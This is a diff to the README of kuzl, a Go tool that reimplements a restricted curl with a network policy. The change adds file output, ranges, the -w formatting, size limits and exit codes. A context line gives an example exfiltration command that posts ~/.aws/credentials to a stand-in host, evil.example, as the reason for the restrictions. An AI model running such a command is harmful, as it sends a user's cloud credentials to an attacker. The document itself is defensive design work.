@@ -11,9 +11,9 @@ is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
 and sends it out in one call.
 
 The design and roadmap live in
-[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 to 3 are in: the
-skeleton, the network policy (`internal/netguard`) and `curl` for GET and
-HEAD. Writing to a file (`-o`) is step 4.
+[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 to 4 are in: the
+skeleton, the network policy (`internal/netguard`), `curl` for GET and HEAD,
+and files and ranges (`-o`, `-O`, `-r`, `-w`).
 
 ## curl
 
@@ -23,10 +23,12 @@ curl [flags] <url>
 
 The flags are curl's: `-s`, `-S`, `-f`, `--fail-with-body`, `-L`,
 `--max-redirs`, `-I`, `-i`, `-X GET|HEAD`, `-H`, `-A`, `-e`, `-m`,
-`--connect-timeout` and `--compressed`. Errors are curl's `curl: (N) message`
-with curl's exit code: 3 for a malformed URL, 6 when the host doesn't
-resolve, 7 when it can't be reached, 22 for `-f` on a status of 400 or more,
-28 on a timeout and 47 past `--max-redirs`.
+`--connect-timeout`, `--compressed`, `-o`, `-O`, `--create-dirs`,
+`--max-filesize`, `-r` and `-w`. Errors are curl's `curl: (N) message` with
+curl's exit code: 3 for a malformed URL, 6 when the host doesn't resolve, 7
+when it can't be reached, 22 for `-f` on a status of 400 or more, 23 when the
+output can't be written, 28 on a timeout, 47 past `--max-redirs` and 63 past
+`--max-filesize`.
 
 Where kuzl differs:
 
@@ -38,7 +40,20 @@ Where kuzl differs:
   other than GET or HEAD, and a request the policy refuses.
 - Stdout gets at most 100000 bytes, headers included, cut on a character
   boundary, with a note on stderr of how much was left out. A body that isn't
-  UTF-8 text is not written to stdout and exits 23.
+  UTF-8 text is not written to stdout and exits 23. The note points at `-o`.
+- `-o` and `-O` write only inside `KUZL_ROOT`, or the working directory if it
+  is unset. A path outside it is refused (exit 2) before the request is sent,
+  and a symlink as the file itself fails with exit 23. Missing directories are
+  always created, so `--create-dirs` changes nothing. `-O` takes the name from
+  the URL's last path segment as written, not decoded, and not from where
+  `-L` ends up.
+- A download is at most 100 MiB; `--max-filesize` can lower that, not raise
+  it. Past it, curl's exit 63: with `-o` the part written so far stays, on
+  stdout nothing is written.
+- `-w` knows `%{http_code}`, `%{content_type}`, `%{url_effective}` and
+  `%{size_download}`; any other variable is a usage error, and `-w @file` is
+  refused. It is written after HTTP and transfer errors, as curl does, but
+  not after a refusal.
 - One URL per call. `-i` and `-I` print the headers sorted, in Go's
   canonical case, not in the server's order.
 - The default `User-Agent` is `kuzl/<version>`; `-A` sets another.
